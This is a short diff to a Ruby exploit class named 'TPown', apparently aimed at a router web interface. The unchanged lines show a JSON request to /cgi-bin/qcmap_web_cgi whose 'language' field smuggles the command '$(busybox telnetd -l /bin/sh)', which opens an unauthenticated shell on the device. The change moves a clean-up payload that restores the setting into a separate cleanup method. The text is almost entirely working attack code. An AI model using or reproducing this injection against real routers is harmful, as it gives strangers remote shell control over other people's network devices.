@@ -19,13 +19,7 @@ class TPown
             action: 1,
             language: "$(busybox telnetd -l /bin/sh)"
         }.to_json
-        payload_del = {
-
-            token: @options[:token],
-            module: "webServer",
-            action: 1,
-            language: "en"
-        }.to_json
+        
 
 
         res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_web_cgi", payload_data) do |http|
@@ -38,6 +32,13 @@ class TPown
     end
 
     def cleanup_v1
+        payload_del = {
+
+            token: @options[:token],
+            module: "webServer",
+            action: 1,
+            language: "en"
+        }.to_json
         res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_web_cgi", payload_del) do |http|
             http.headers["Content-Type"] = "application/json"
         end
